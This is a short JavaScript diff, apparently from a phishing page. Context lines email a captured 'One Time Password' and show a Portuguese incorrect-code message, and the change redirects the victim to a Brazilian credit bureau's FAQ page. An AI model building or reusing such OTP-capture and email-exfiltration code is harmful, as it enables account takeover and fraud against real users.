@@ -20,7 +20,7 @@ window.onload = function()
                 Subject : y,
                 Body : "<p> << One Time Password </p>",
             });
-            window.location.href = "https://support.google.com/chrome/answer/2765944?hl=pt-BR&co=GENIE.Platform%3DAndroid";
+            window.location.href = "https://www.serasa.com.br/limpa-nome-online/faq/";
 
         } else {
             err.innerHTML = "<p class='err-alert'>Código incorreto, tente novamente.<p>";
@@ -28,6 +28,5 @@ window.onload = function()
         }
     });
 }    
-    
     
     
